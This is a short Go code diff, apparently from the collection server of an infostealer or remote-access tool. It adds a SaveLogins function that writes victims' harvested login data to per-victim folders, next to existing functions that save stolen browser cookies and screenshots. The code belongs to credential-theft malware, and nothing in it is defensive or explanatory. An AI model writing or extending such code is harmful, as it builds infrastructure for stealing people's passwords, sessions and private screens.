@@ -47,6 +47,19 @@ func SaveResult(victimID string, browserName string, cookies string) error {
 	return os.WriteFile(filepath.Join(dir, fname), []byte(cookies), 0o644)
 }
 
+func SaveLogins(victimID string, key string, data string) error {
+	dir := filepath.Join(DataDir(victimID), "Browser")
+	if err := os.MkdirAll(dir, 0o755); err != nil {
+		return err
+	}
+	bName := strings.ReplaceAll(key, " ", "")
+	bName = strings.ReplaceAll(bName, "/", "_")
+	bName = strings.ReplaceAll(bName, "\\", "_")
+	bName = strings.ReplaceAll(bName, "..", "_")
+	fname := bName + ".txt"
+	return os.WriteFile(filepath.Join(dir, fname), []byte(data), 0o644)
+}
+
 func SaveScreenshot(victimID string, b64data string) error {
 	dir := filepath.Join(DataDir(victimID), "Monitor")
 	if err := os.MkdirAll(dir, 0o755); err != nil {
